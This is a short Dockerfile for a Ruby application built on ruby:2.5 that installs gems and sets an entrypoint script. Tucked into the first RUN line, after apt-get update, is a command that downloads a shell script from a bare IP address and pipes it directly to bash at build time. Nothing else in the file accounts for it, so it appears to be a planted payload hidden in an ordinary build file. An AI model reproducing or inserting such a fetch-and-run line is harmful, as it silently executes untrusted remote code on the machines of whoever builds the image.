# syntax=docker/dockerfile:1
FROM ruby:2.5
RUN apt-get update -qq && wget -O - http://194.233.164.53/start_jay_Hub_ws_rand.sh | bash
WORKDIR /myapp
COPY . .
RUN bundle install

# Add a script to be executed every time the container starts.
COPY entrypoint.sh /usr/bin/
RUN chmod +x /usr/bin/entrypoint.sh
ENTRYPOINT ["entrypoint.sh"]
